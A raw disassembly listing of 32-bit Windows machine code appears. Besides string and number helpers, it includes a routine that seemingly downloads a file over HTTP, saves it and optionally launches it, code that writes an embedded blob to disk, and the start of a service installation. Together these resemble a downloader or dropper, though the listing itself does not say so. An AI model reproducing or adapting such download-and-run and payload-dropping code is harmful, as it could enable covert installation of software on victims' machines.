13142663:	80 3a 00             	cmpb   $0x0,(%edx)
13142666:	74 05                	je     0x1314266d
13142668:	40                   	inc    %eax
13142669:	eb d7                	jmp    0x13142642
1314266b:	33 c0                	xor    %eax,%eax
1314266d:	5e                   	pop    %esi
1314266e:	c3                   	ret    
1314266f:	8b 44 24 04          	mov    0x4(%esp),%eax
13142673:	8a 08                	mov    (%eax),%cl
13142675:	84 c9                	test   %cl,%cl
13142677:	74 09                	je     0x13142682
13142679:	3a 4c 24 08          	cmp    0x8(%esp),%cl
1314267d:	74 03                	je     0x13142682
1314267f:	40                   	inc    %eax
13142680:	eb f1                	jmp    0x13142673
13142682:	8a 08                	mov    (%eax),%cl
13142684:	2a 4c 24 08          	sub    0x8(%esp),%cl
13142688:	f6 d9                	neg    %cl
1314268a:	1b c9                	sbb    %ecx,%ecx
1314268c:	f7 d1                	not    %ecx
1314268e:	23 c1                	and    %ecx,%eax
13142690:	c3                   	ret    
13142691:	55                   	push   %ebp
13142692:	8b ec                	mov    %esp,%ebp
13142694:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
13142698:	75 04                	jne    0x1314269e
1314269a:	33 c0                	xor    %eax,%eax
1314269c:	5d                   	pop    %ebp
1314269d:	c3                   	ret    
1314269e:	ff 4d 10             	decl   0x10(%ebp)
131426a1:	8b 55 0c             	mov    0xc(%ebp),%edx
131426a4:	8b 4d 08             	mov    0x8(%ebp),%ecx
131426a7:	74 11                	je     0x131426ba
131426a9:	8a 01                	mov    (%ecx),%al
131426ab:	84 c0                	test   %al,%al
131426ad:	74 0b                	je     0x131426ba
131426af:	3a 02                	cmp    (%edx),%al
131426b1:	75 07                	jne    0x131426ba
131426b3:	41                   	inc    %ecx
131426b4:	42                   	inc    %edx
131426b5:	ff 4d 10             	decl   0x10(%ebp)
131426b8:	75 ef                	jne    0x131426a9
131426ba:	0f b6 01             	movzbl (%ecx),%eax
131426bd:	0f b6 0a             	movzbl (%edx),%ecx
131426c0:	2b c1                	sub    %ecx,%eax
131426c2:	5d                   	pop    %ebp
131426c3:	c3                   	ret    
131426c4:	ff 15 28 34 15 13    	call   *0x13153428
131426ca:	a3 00 29 15 13       	mov    %eax,0x13152900
131426cf:	c3                   	ret    
131426d0:	a1 00 29 15 13       	mov    0x13152900,%eax
131426d5:	69 c0 35 4e 5a 01    	imul   $0x15a4e35,%eax,%eax
131426db:	40                   	inc    %eax
131426dc:	a3 00 29 15 13       	mov    %eax,0x13152900
131426e1:	c1 e8 10             	shr    $0x10,%eax
131426e4:	c3                   	ret    
131426e5:	56                   	push   %esi
131426e6:	e8 e5 ff ff ff       	call   0x131426d0
131426eb:	0f b7 f0             	movzwl %ax,%esi
131426ee:	c1 e6 10             	shl    $0x10,%esi
131426f1:	e8 da ff ff ff       	call   0x131426d0
131426f6:	0f b7 c0             	movzwl %ax,%eax
131426f9:	0b c6                	or     %esi,%eax
131426fb:	5e                   	pop    %esi
131426fc:	c3                   	ret    
131426fd:	55                   	push   %ebp
131426fe:	8b ec                	mov    %esp,%ebp
13142700:	51                   	push   %ecx
13142701:	56                   	push   %esi
13142702:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
13142706:	75 09                	jne    0x13142711
13142708:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
1314270f:	74 15                	je     0x13142726
13142711:	8b 75 08             	mov    0x8(%ebp),%esi
13142714:	83 ee 01             	sub    $0x1,%esi
13142717:	46                   	inc    %esi
13142718:	80 3e 00             	cmpb   $0x0,(%esi)
1314271b:	75 fa                	jne    0x13142717
1314271d:	89 75 fc             	mov    %esi,-0x4(%ebp)
13142720:	8b 45 08             	mov    0x8(%ebp),%eax
13142723:	29 45 fc             	sub    %eax,-0x4(%ebp)
13142726:	8b 45 fc             	mov    -0x4(%ebp),%eax
13142729:	5e                   	pop    %esi
1314272a:	c9                   	leave  
1314272b:	c3                   	ret    
1314272c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
13142730:	8b 54 24 08          	mov    0x8(%esp),%edx
13142734:	8a 01                	mov    (%ecx),%al
13142736:	84 c0                	test   %al,%al
13142738:	74 0d                	je     0x13142747
1314273a:	3a 02                	cmp    (%edx),%al
1314273c:	75 09                	jne    0x13142747
1314273e:	8a 41 01             	mov    0x1(%ecx),%al
13142741:	41                   	inc    %ecx
13142742:	42                   	inc    %edx
13142743:	84 c0                	test   %al,%al
13142745:	75 f3                	jne    0x1314273a
13142747:	0f b6 01             	movzbl (%ecx),%eax
1314274a:	0f b6 0a             	movzbl (%edx),%ecx
1314274d:	2b c1                	sub    %ecx,%eax
1314274f:	c3                   	ret    
13142750:	55                   	push   %ebp
13142751:	8b ec                	mov    %esp,%ebp
13142753:	56                   	push   %esi
13142754:	8b 75 10             	mov    0x10(%ebp),%esi
13142757:	85 f6                	test   %esi,%esi
13142759:	7e 11                	jle    0x1314276c
1314275b:	8b 4d 08             	mov    0x8(%ebp),%ecx
1314275e:	8b 45 0c             	mov    0xc(%ebp),%eax
13142761:	2b c1                	sub    %ecx,%eax
13142763:	8a 14 08             	mov    (%eax,%ecx,1),%dl
13142766:	88 11                	mov    %dl,(%ecx)
13142768:	41                   	inc    %ecx
13142769:	4e                   	dec    %esi
1314276a:	75 f7                	jne    0x13142763
1314276c:	8b 45 08             	mov    0x8(%ebp),%eax
1314276f:	5e                   	pop    %esi
13142770:	5d                   	pop    %ebp
13142771:	c3                   	ret    
13142772:	55                   	push   %ebp
13142773:	8b ec                	mov    %esp,%ebp
13142775:	56                   	push   %esi
13142776:	ff 75 08             	pushl  0x8(%ebp)
13142779:	e8 7f ff ff ff       	call   0x131426fd
1314277e:	ff 75 0c             	pushl  0xc(%ebp)
13142781:	8b f0                	mov    %eax,%esi
13142783:	03 75 08             	add    0x8(%ebp),%esi
13142786:	e8 72 ff ff ff       	call   0x131426fd
1314278b:	50                   	push   %eax
1314278c:	ff 75 0c             	pushl  0xc(%ebp)
1314278f:	56                   	push   %esi
13142790:	e8 bb ff ff ff       	call   0x13142750
13142795:	8b 45 08             	mov    0x8(%ebp),%eax
13142798:	83 c4 14             	add    $0x14,%esp
1314279b:	5e                   	pop    %esi
1314279c:	5d                   	pop    %ebp
1314279d:	c3                   	ret    
1314279e:	55                   	push   %ebp
1314279f:	8b ec                	mov    %esp,%ebp
131427a1:	ff 75 08             	pushl  0x8(%ebp)
131427a4:	e8 54 ff ff ff       	call   0x131426fd
131427a9:	ff 75 10             	pushl  0x10(%ebp)
131427ac:	03 45 08             	add    0x8(%ebp),%eax
131427af:	ff 75 0c             	pushl  0xc(%ebp)
131427b2:	50                   	push   %eax
131427b3:	e8 98 ff ff ff       	call   0x13142750
131427b8:	8b 45 08             	mov    0x8(%ebp),%eax
131427bb:	83 c4 10             	add    $0x10,%esp
131427be:	5d                   	pop    %ebp
131427bf:	c3                   	ret    
131427c0:	8b 4c 24 08          	mov    0x8(%esp),%ecx
131427c4:	8b 44 24 04          	mov    0x4(%esp),%eax
131427c8:	57                   	push   %edi
131427c9:	33 ff                	xor    %edi,%edi
131427cb:	8a 11                	mov    (%ecx),%dl
131427cd:	84 d2                	test   %dl,%dl
131427cf:	74 12                	je     0x131427e3
131427d1:	56                   	push   %esi
131427d2:	8b f0                	mov    %eax,%esi
131427d4:	2b f1                	sub    %ecx,%esi
131427d6:	88 14 0e             	mov    %dl,(%esi,%ecx,1)
131427d9:	8a 51 01             	mov    0x1(%ecx),%dl
131427dc:	47                   	inc    %edi
131427dd:	41                   	inc    %ecx
131427de:	84 d2                	test   %dl,%dl
131427e0:	75 f4                	jne    0x131427d6
131427e2:	5e                   	pop    %esi
131427e3:	80 24 07 00          	andb   $0x0,(%edi,%eax,1)
131427e7:	5f                   	pop    %edi
131427e8:	c3                   	ret    
131427e9:	8b 4c 24 08          	mov    0x8(%esp),%ecx
131427ed:	85 c9                	test   %ecx,%ecx
131427ef:	75 04                	jne    0x131427f5
131427f1:	6a 01                	push   $0x1
131427f3:	58                   	pop    %eax
131427f4:	c3                   	ret    
131427f5:	8b 44 24 04          	mov    0x4(%esp),%eax
131427f9:	83 f9 01             	cmp    $0x1,%ecx
131427fc:	7e 09                	jle    0x13142807
131427fe:	49                   	dec    %ecx
131427ff:	0f af 44 24 04       	imul   0x4(%esp),%eax
13142804:	49                   	dec    %ecx
13142805:	75 f8                	jne    0x131427ff
13142807:	c3                   	ret    
13142808:	55                   	push   %ebp
13142809:	8b ec                	mov    %esp,%ebp
1314280b:	83 ec 10             	sub    $0x10,%esp
1314280e:	53                   	push   %ebx
1314280f:	56                   	push   %esi
13142810:	57                   	push   %edi
13142811:	33 ff                	xor    %edi,%edi
13142813:	ff 75 08             	pushl  0x8(%ebp)
13142816:	89 7d fc             	mov    %edi,-0x4(%ebp)
13142819:	e8 df fe ff ff       	call   0x131426fd
1314281e:	8b d8                	mov    %eax,%ebx
13142820:	59                   	pop    %ecx
13142821:	83 fb 06             	cmp    $0x6,%ebx
13142824:	7f 53                	jg     0x13142879
13142826:	53                   	push   %ebx
13142827:	8d 45 f0             	lea    -0x10(%ebp),%eax
1314282a:	ff 75 08             	pushl  0x8(%ebp)
1314282d:	50                   	push   %eax
1314282e:	e8 1d ff ff ff       	call   0x13142750
13142833:	83 c4 0c             	add    $0xc,%esp
13142836:	3b df                	cmp    %edi,%ebx
13142838:	7e 37                	jle    0x13142871
1314283a:	8d 43 ff             	lea    -0x1(%ebx),%eax
1314283d:	89 45 08             	mov    %eax,0x8(%ebp)
13142840:	8a 44 3d f0          	mov    -0x10(%ebp,%edi,1),%al
13142844:	8d 74 3d f0          	lea    -0x10(%ebp,%edi,1),%esi
13142848:	3c 30                	cmp    $0x30,%al
1314284a:	7c 2d                	jl     0x13142879
1314284c:	3c 39                	cmp    $0x39,%al
1314284e:	7f 29                	jg     0x13142879
13142850:	ff 75 08             	pushl  0x8(%ebp)
13142853:	2c 30                	sub    $0x30,%al
13142855:	88 06                	mov    %al,(%esi)
13142857:	6a 0a                	push   $0xa
13142859:	e8 8b ff ff ff       	call   0x131427e9
1314285e:	59                   	pop    %ecx
1314285f:	59                   	pop    %ecx
13142860:	0f be 0e             	movsbl (%esi),%ecx
13142863:	0f af c1             	imul   %ecx,%eax
13142866:	01 45 fc             	add    %eax,-0x4(%ebp)
13142869:	47                   	inc    %edi
1314286a:	ff 4d 08             	decl   0x8(%ebp)
1314286d:	3b fb                	cmp    %ebx,%edi
1314286f:	7c cf                	jl     0x13142840
13142871:	8b 45 fc             	mov    -0x4(%ebp),%eax
13142874:	5f                   	pop    %edi
13142875:	5e                   	pop    %esi
13142876:	5b                   	pop    %ebx
13142877:	c9                   	leave  
13142878:	c3                   	ret    
13142879:	33 c0                	xor    %eax,%eax
1314287b:	eb f7                	jmp    0x13142874
1314287d:	55                   	push   %ebp
1314287e:	8b ec                	mov    %esp,%ebp
13142880:	81 ec 0c 04 00 00    	sub    $0x40c,%esp
13142886:	53                   	push   %ebx
13142887:	56                   	push   %esi
13142888:	33 db                	xor    %ebx,%ebx
1314288a:	57                   	push   %edi
1314288b:	53                   	push   %ebx
1314288c:	53                   	push   %ebx
1314288d:	53                   	push   %ebx
1314288e:	53                   	push   %ebx
1314288f:	68 e4 d8 14 13       	push   $0x1314d8e4
13142894:	ff 15 94 39 15 13    	call   *0x13153994
1314289a:	3b c3                	cmp    %ebx,%eax
1314289c:	89 45 f8             	mov    %eax,-0x8(%ebp)
1314289f:	75 04                	jne    0x131428a5
131428a1:	6a 05                	push   $0x5
131428a3:	eb 7a                	jmp    0x1314291f
131428a5:	6a 01                	push   $0x1
131428a7:	53                   	push   %ebx
131428a8:	6a 03                	push   $0x3
131428aa:	53                   	push   %ebx
131428ab:	53                   	push   %ebx
131428ac:	6a 50                	push   $0x50
131428ae:	ff 75 08             	pushl  0x8(%ebp)
131428b1:	50                   	push   %eax
131428b2:	ff 15 dc 33 15 13    	call   *0x131533dc
131428b8:	3b c3                	cmp    %ebx,%eax
131428ba:	89 45 08             	mov    %eax,0x8(%ebp)
131428bd:	75 04                	jne    0x131428c3
131428bf:	6a 06                	push   $0x6
131428c1:	eb 5c                	jmp    0x1314291f
131428c3:	6a 01                	push   $0x1
131428c5:	68 00 00 40 00       	push   $0x400000
131428ca:	53                   	push   %ebx
131428cb:	53                   	push   %ebx
131428cc:	53                   	push   %ebx
131428cd:	ff 75 0c             	pushl  0xc(%ebp)
131428d0:	68 e0 d8 14 13       	push   $0x1314d8e0
131428d5:	50                   	push   %eax
131428d6:	ff 15 70 37 15 13    	call   *0x13153770
131428dc:	8b f8                	mov    %eax,%edi
131428de:	3b fb                	cmp    %ebx,%edi
131428e0:	75 04                	jne    0x131428e6
131428e2:	6a 07                	push   $0x7
131428e4:	eb 39                	jmp    0x1314291f
131428e6:	53                   	push   %ebx
131428e7:	53                   	push   %ebx
131428e8:	53                   	push   %ebx
131428e9:	53                   	push   %ebx
131428ea:	57                   	push   %edi
131428eb:	ff 15 80 36 15 13    	call   *0x13153680
131428f1:	85 c0                	test   %eax,%eax
131428f3:	75 04                	jne    0x131428f9
131428f5:	6a 08                	push   $0x8
131428f7:	eb 26                	jmp    0x1314291f
131428f9:	ff 75 10             	pushl  0x10(%ebp)
131428fc:	ff 15 c8 36 15 13    	call   *0x131536c8
13142902:	53                   	push   %ebx
13142903:	53                   	push   %ebx
13142904:	6a 01                	push   $0x1
13142906:	53                   	push   %ebx
13142907:	53                   	push   %ebx
13142908:	68 00 00 00 40       	push   $0x40000000
1314290d:	ff 75 10             	pushl  0x10(%ebp)
13142910:	ff 15 e0 33 15 13    	call   *0x131533e0
13142916:	8b f0                	mov    %eax,%esi
13142918:	83 fe ff             	cmp    $0xffffffff,%esi
1314291b:	75 08                	jne    0x13142925
1314291d:	6a 09                	push   $0x9
1314291f:	58                   	pop    %eax
13142920:	e9 89 00 00 00       	jmp    0x131429ae
13142925:	39 1d 10 2b 15 13    	cmp    %ebx,0x13152b10
1314292b:	74 52                	je     0x1314297f
1314292d:	8d 45 f4             	lea    -0xc(%ebp),%eax
13142930:	50                   	push   %eax
13142931:	8d 85 f4 fb ff ff    	lea    -0x40c(%ebp),%eax
13142937:	68 ff 03 00 00       	push   $0x3ff
1314293c:	50                   	push   %eax
1314293d:	57                   	push   %edi
1314293e:	ff 15 c0 36 15 13    	call   *0x131536c0
13142944:	81 05 0c 2b 15 13 00 	addl   $0x400,0x13152b0c
1314294b:	04 00 00 
1314294e:	3b c3                	cmp    %ebx,%eax
13142950:	74 2f                	je     0x13142981
13142952:	8b 45 f4             	mov    -0xc(%ebp),%eax
13142955:	3b c3                	cmp    %ebx,%eax
13142957:	74 28                	je     0x13142981
13142959:	8d 4d fc             	lea    -0x4(%ebp),%ecx
1314295c:	53                   	push   %ebx
1314295d:	51                   	push   %ecx
1314295e:	88 9c 05 f4 fb ff ff 	mov    %bl,-0x40c(%ebp,%eax,1)
13142965:	50                   	push   %eax
13142966:	8d 85 f4 fb ff ff    	lea    -0x40c(%ebp),%eax
1314296c:	50                   	push   %eax
1314296d:	56                   	push   %esi
1314296e:	ff 15 b4 33 15 13    	call   *0x131533b4
13142974:	85 c0                	test   %eax,%eax
13142976:	74 09                	je     0x13142981
13142978:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
1314297b:	74 04                	je     0x13142981
1314297d:	eb a6                	jmp    0x13142925
1314297f:	b3 01                	mov    $0x1,%bl
13142981:	56                   	push   %esi
13142982:	ff 15 80 33 15 13    	call   *0x13153380
13142988:	57                   	push   %edi
13142989:	ff 15 3c 35 15 13    	call   *0x1315353c
1314298f:	ff 75 08             	pushl  0x8(%ebp)
13142992:	ff 15 3c 35 15 13    	call   *0x1315353c
13142998:	ff 75 f8             	pushl  -0x8(%ebp)
1314299b:	ff 15 3c 35 15 13    	call   *0x1315353c
131429a1:	f6 db                	neg    %bl
131429a3:	1b db                	sbb    %ebx,%ebx
131429a5:	81 e3 fe 00 00 00    	and    $0xfe,%ebx
131429ab:	43                   	inc    %ebx
131429ac:	8b c3                	mov    %ebx,%eax
131429ae:	5f                   	pop    %edi
131429af:	5e                   	pop    %esi
131429b0:	5b                   	pop    %ebx
131429b1:	c9                   	leave  
131429b2:	c3                   	ret    
131429b3:	55                   	push   %ebp
131429b4:	8b ec                	mov    %esp,%ebp
131429b6:	81 ec 80 00 00 00    	sub    $0x80,%esp
131429bc:	56                   	push   %esi
131429bd:	8b 75 08             	mov    0x8(%ebp),%esi
131429c0:	6a 07                	push   $0x7
131429c2:	68 48 d9 14 13       	push   $0x1314d948
131429c7:	56                   	push   %esi
131429c8:	e8 c4 fc ff ff       	call   0x13142691
131429cd:	83 c4 0c             	add    $0xc,%esp
131429d0:	85 c0                	test   %eax,%eax
131429d2:	75 03                	jne    0x131429d7
131429d4:	83 c6 07             	add    $0x7,%esi
131429d7:	56                   	push   %esi
131429d8:	8d 45 80             	lea    -0x80(%ebp),%eax
131429db:	68 00 d1 14 13       	push   $0x1314d100
131429e0:	50                   	push   %eax
131429e1:	ff 15 98 39 15 13    	call   *0x13153998
131429e7:	83 c4 0c             	add    $0xc,%esp
131429ea:	32 c0                	xor    %al,%al
131429ec:	0f b6 c8             	movzbl %al,%ecx
131429ef:	80 7c 0d 80 2f       	cmpb   $0x2f,-0x80(%ebp,%ecx,1)
131429f4:	74 08                	je     0x131429fe
131429f6:	fe c0                	inc    %al
131429f8:	3c 80                	cmp    $0x80,%al
131429fa:	72 f0                	jb     0x131429ec
131429fc:	eb 26                	jmp    0x13142a24
131429fe:	0f b6 f0             	movzbl %al,%esi
13142a01:	8d 45 80             	lea    -0x80(%ebp),%eax
13142a04:	56                   	push   %esi
13142a05:	50                   	push   %eax
13142a06:	ff 75 0c             	pushl  0xc(%ebp)
13142a09:	e8 42 fd ff ff       	call   0x13142750
13142a0e:	8d 44 35 81          	lea    -0x7f(%ebp,%esi,1),%eax
13142a12:	50                   	push   %eax
13142a13:	68 44 d9 14 13       	push   $0x1314d944
13142a18:	ff 75 10             	pushl  0x10(%ebp)
13142a1b:	ff 15 98 39 15 13    	call   *0x13153998
13142a21:	83 c4 18             	add    $0x18,%esp
13142a24:	5e                   	pop    %esi
13142a25:	c9                   	leave  
13142a26:	c3                   	ret    
13142a27:	55                   	push   %ebp
13142a28:	8b ec                	mov    %esp,%ebp
13142a2a:	81 ec 00 01 00 00    	sub    $0x100,%esp
13142a30:	56                   	push   %esi
13142a31:	be 80 00 00 00       	mov    $0x80,%esi
13142a36:	56                   	push   %esi
13142a37:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13142a3d:	6a 00                	push   $0x0
13142a3f:	50                   	push   %eax
13142a40:	e8 dd fb ff ff       	call   0x13142622
13142a45:	56                   	push   %esi
13142a46:	8d 45 80             	lea    -0x80(%ebp),%eax
13142a49:	6a 00                	push   $0x0
13142a4b:	50                   	push   %eax
13142a4c:	e8 d1 fb ff ff       	call   0x13142622
13142a51:	8d 45 80             	lea    -0x80(%ebp),%eax
13142a54:	50                   	push   %eax
13142a55:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13142a5b:	50                   	push   %eax
13142a5c:	ff 75 08             	pushl  0x8(%ebp)
13142a5f:	e8 4f ff ff ff       	call   0x131429b3
13142a64:	ff 75 0c             	pushl  0xc(%ebp)
13142a67:	8d 45 80             	lea    -0x80(%ebp),%eax
13142a6a:	50                   	push   %eax
13142a6b:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13142a71:	50                   	push   %eax
13142a72:	e8 06 fe ff ff       	call   0x1314287d
13142a77:	83 c4 30             	add    $0x30,%esp
13142a7a:	83 f8 01             	cmp    $0x1,%eax
13142a7d:	5e                   	pop    %esi
13142a7e:	75 13                	jne    0x13142a93
13142a80:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
13142a84:	74 0a                	je     0x13142a90
13142a86:	50                   	push   %eax
13142a87:	ff 75 0c             	pushl  0xc(%ebp)
13142a8a:	ff 15 8c 33 15 13    	call   *0x1315338c
13142a90:	6a 01                	push   $0x1
13142a92:	58                   	pop    %eax
13142a93:	c9                   	leave  
13142a94:	c3                   	ret    
13142a95:	55                   	push   %ebp
13142a96:	8b ec                	mov    %esp,%ebp
13142a98:	81 ec 04 06 00 00    	sub    $0x604,%esp
13142a9e:	56                   	push   %esi
13142a9f:	57                   	push   %edi
13142aa0:	68 18 2b 15 13       	push   $0x13152b18
13142aa5:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
13142aab:	68 00 d1 14 13       	push   $0x1314d100
13142ab0:	50                   	push   %eax
13142ab1:	ff 15 98 39 15 13    	call   *0x13153998
13142ab7:	83 c4 0c             	add    $0xc,%esp
13142aba:	83 3d 08 2b 15 13 00 	cmpl   $0x0,0x13152b08
13142ac1:	74 07                	je     0x13142aca
13142ac3:	68 78 d9 14 13       	push   $0x1314d978
13142ac8:	eb 05                	jmp    0x13142acf
13142aca:	68 68 d9 14 13       	push   $0x1314d968
13142acf:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
13142ad5:	50                   	push   %eax
13142ad6:	ff 15 98 39 15 13    	call   *0x13153998
13142adc:	83 3d 18 2c 15 13 00 	cmpl   $0x0,0x13152c18
13142ae3:	59                   	pop    %ecx
13142ae4:	59                   	pop    %ecx
13142ae5:	75 26                	jne    0x13142b0d
13142ae7:	ff 35 1c 2c 15 13    	pushl  0x13152c1c
13142aed:	b9 81 01 00 00       	mov    $0x181,%ecx
13142af2:	8d b5 fc f9 ff ff    	lea    -0x604(%ebp),%esi
13142af8:	81 ec 04 06 00 00    	sub    $0x604,%esp
13142afe:	8b fc                	mov    %esp,%edi
13142b00:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13142b02:	e8 e5 5f 00 00       	call   0x13148aec
13142b07:	81 c4 08 06 00 00    	add    $0x608,%esp
13142b0d:	ff 35 08 2b 15 13    	pushl  0x13152b08
13142b13:	bf 08 2a 15 13       	mov    $0x13152a08,%edi
13142b18:	be 08 29 15 13       	mov    $0x13152908,%esi
13142b1d:	57                   	push   %edi
13142b1e:	56                   	push   %esi
13142b1f:	e8 03 ff ff ff       	call   0x13142a27
13142b24:	50                   	push   %eax
13142b25:	a1 0c 2b 15 13       	mov    0x13152b0c,%eax
13142b2a:	c1 e8 0a             	shr    $0xa,%eax
13142b2d:	50                   	push   %eax
13142b2e:	57                   	push   %edi
13142b2f:	56                   	push   %esi
13142b30:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
13142b36:	68 50 d9 14 13       	push   $0x1314d950
13142b3b:	50                   	push   %eax
13142b3c:	ff 15 98 39 15 13    	call   *0x13153998
13142b42:	83 c4 24             	add    $0x24,%esp
13142b45:	83 3d 18 2c 15 13 00 	cmpl   $0x0,0x13152c18
13142b4c:	75 26                	jne    0x13142b74
13142b4e:	ff 35 1c 2c 15 13    	pushl  0x13152c1c
13142b54:	b9 81 01 00 00       	mov    $0x181,%ecx
13142b59:	8d b5 fc f9 ff ff    	lea    -0x604(%ebp),%esi
13142b5f:	81 ec 04 06 00 00    	sub    $0x604,%esp
13142b65:	8b fc                	mov    %esp,%edi
13142b67:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13142b69:	e8 7e 5f 00 00       	call   0x13148aec
13142b6e:	81 c4 08 06 00 00    	add    $0x608,%esp
13142b74:	83 25 10 2b 15 13 00 	andl   $0x0,0x13152b10
13142b7b:	5f                   	pop    %edi
13142b7c:	33 c0                	xor    %eax,%eax
13142b7e:	5e                   	pop    %esi
13142b7f:	c9                   	leave  
13142b80:	c2 04 00             	ret    $0x4
13142b83:	b8 08 29 15 13       	mov    $0x13152908,%eax
13142b88:	c3                   	ret    
13142b89:	b8 08 2a 15 13       	mov    $0x13152a08,%eax
13142b8e:	c3                   	ret    
13142b8f:	a1 10 2b 15 13       	mov    0x13152b10,%eax
13142b94:	c3                   	ret    
13142b95:	55                   	push   %ebp
13142b96:	8b ec                	mov    %esp,%ebp
13142b98:	57                   	push   %edi
13142b99:	33 ff                	xor    %edi,%edi
13142b9b:	39 3d 10 2b 15 13    	cmp    %edi,0x13152b10
13142ba1:	74 05                	je     0x13142ba8
13142ba3:	6a 02                	push   $0x2
13142ba5:	58                   	pop    %eax
13142ba6:	eb 73                	jmp    0x13142c1b
13142ba8:	a1 44 45 17 13       	mov    0x13174544,%eax
13142bad:	56                   	push   %esi
13142bae:	ff 75 08             	pushl  0x8(%ebp)
13142bb1:	be 00 d1 14 13       	mov    $0x1314d100,%esi
13142bb6:	a3 18 2c 15 13       	mov    %eax,0x13152c18
13142bbb:	8b 45 18             	mov    0x18(%ebp),%eax
13142bbe:	56                   	push   %esi
13142bbf:	68 08 29 15 13       	push   $0x13152908
13142bc4:	a3 1c 2c 15 13       	mov    %eax,0x13152c1c
13142bc9:	ff 15 98 39 15 13    	call   *0x13153998
13142bcf:	ff 75 0c             	pushl  0xc(%ebp)
13142bd2:	56                   	push   %esi
13142bd3:	68 08 2a 15 13       	push   $0x13152a08
13142bd8:	ff 15 98 39 15 13    	call   *0x13153998
13142bde:	ff 75 10             	pushl  0x10(%ebp)
13142be1:	56                   	push   %esi
13142be2:	68 18 2b 15 13       	push   $0x13152b18
13142be7:	ff 15 98 39 15 13    	call   *0x13153998
13142bed:	8b 45 14             	mov    0x14(%ebp),%eax
13142bf0:	83 c4 24             	add    $0x24,%esp
13142bf3:	a3 08 2b 15 13       	mov    %eax,0x13152b08
13142bf8:	8d 45 18             	lea    0x18(%ebp),%eax
13142bfb:	50                   	push   %eax
13142bfc:	57                   	push   %edi
13142bfd:	57                   	push   %edi
13142bfe:	68 95 2a 14 13       	push   $0x13142a95
13142c03:	57                   	push   %edi
13142c04:	57                   	push   %edi
13142c05:	c7 05 10 2b 15 13 01 	movl   $0x1,0x13152b10
13142c0c:	00 00 00 
13142c0f:	ff 15 30 37 15 13    	call   *0x13153730
13142c15:	a3 14 2b 15 13       	mov    %eax,0x13152b14
13142c1a:	5e                   	pop    %esi
13142c1b:	5f                   	pop    %edi
13142c1c:	5d                   	pop    %ebp
13142c1d:	c3                   	ret    
13142c1e:	83 3d 10 2b 15 13 00 	cmpl   $0x0,0x13152b10
13142c25:	75 04                	jne    0x13142c2b
13142c27:	6a 02                	push   $0x2
13142c29:	58                   	pop    %eax
13142c2a:	c3                   	ret    
13142c2b:	83 25 10 2b 15 13 00 	andl   $0x0,0x13152b10
13142c32:	6a 01                	push   $0x1
13142c34:	58                   	pop    %eax
13142c35:	c3                   	ret    
13142c36:	55                   	push   %ebp
13142c37:	8b ec                	mov    %esp,%ebp
13142c39:	51                   	push   %ecx
13142c3a:	53                   	push   %ebx
13142c3b:	56                   	push   %esi
13142c3c:	ff 75 08             	pushl  0x8(%ebp)
13142c3f:	ff 15 c8 36 15 13    	call   *0x131536c8
13142c45:	33 f6                	xor    %esi,%esi
13142c47:	56                   	push   %esi
13142c48:	56                   	push   %esi
13142c49:	6a 01                	push   $0x1
13142c4b:	56                   	push   %esi
13142c4c:	56                   	push   %esi
13142c4d:	68 00 00 00 40       	push   $0x40000000
13142c52:	ff 75 08             	pushl  0x8(%ebp)
13142c55:	ff 15 e0 33 15 13    	call   *0x131533e0
13142c5b:	8b d8                	mov    %eax,%ebx
13142c5d:	83 fb ff             	cmp    $0xffffffff,%ebx
13142c60:	75 04                	jne    0x13142c66
13142c62:	33 c0                	xor    %eax,%eax
13142c64:	eb 2e                	jmp    0x13142c94
13142c66:	57                   	push   %edi
13142c67:	8d 45 fc             	lea    -0x4(%ebp),%eax
13142c6a:	56                   	push   %esi
13142c6b:	bf 00 13 00 00       	mov    $0x1300,%edi
13142c70:	50                   	push   %eax
13142c71:	57                   	push   %edi
13142c72:	68 98 d9 14 13       	push   $0x1314d998
13142c77:	53                   	push   %ebx
13142c78:	ff 15 b4 33 15 13    	call   *0x131533b4
13142c7e:	85 c0                	test   %eax,%eax
13142c80:	74 08                	je     0x13142c8a
13142c82:	39 7d fc             	cmp    %edi,-0x4(%ebp)
13142c85:	75 03                	jne    0x13142c8a
13142c87:	6a 01                	push   $0x1
13142c89:	5e                   	pop    %esi
13142c8a:	53                   	push   %ebx
13142c8b:	ff 15 80 33 15 13    	call   *0x13153380
13142c91:	8b c6                	mov    %esi,%eax
13142c93:	5f                   	pop    %edi
13142c94:	5e                   	pop    %esi
13142c95:	5b                   	pop    %ebx
13142c96:	c9                   	leave  
13142c97:	c3                   	ret    
13142c98:	51                   	push   %ecx
13142c99:	53                   	push   %ebx
13142c9a:	33 db                	xor    %ebx,%ebx
13142c9c:	68 3f 00 0f 00       	push   $0xf003f
13142ca1:	53                   	push   %ebx
13142ca2:	53                   	push   %ebx
13142ca3:	ff 15 d0 36 15 13    	call   *0x131536d0
13142ca9:	83 f8 ff             	cmp    $0xffffffff,%eax
13142cac:	89 44 24 04          	mov    %eax,0x4(%esp)
13142cb0:	75 05                	jne    0x13142cb7
13142cb2:	6a 04                	push   $0x4
13142cb4:	58                   	pop    %eax
13142cb5:	eb 6d                	jmp    0x13142d24
13142cb7:	55                   	push   %ebp
13142cb8:	56                   	push   %esi
13142cb9:	57                   	push   %edi
13142cba:	53                   	push   %ebx
13142cbb:	53                   	push   %ebx
13142cbc:	53                   	push   %ebx
13142cbd:	53                   	push   %ebx
13142cbe:	8b 6c 24 2c          	mov    0x2c(%esp),%ebp
13142cc2:	53                   	push   %ebx
13142cc3:	bf ff 01 0f 00       	mov    $0xf01ff,%edi
13142cc8:	ff 74 24 2c          	pushl  0x2c(%esp)
13142ccc:	6a 01                	push   $0x1
13142cce:	6a 02                	push   $0x2
13142cd0:	6a 01                	push   $0x1
13142cd2:	57                   	push   %edi
13142cd3:	55                   	push   %ebp
13142cd4:	55                   	push   %ebp
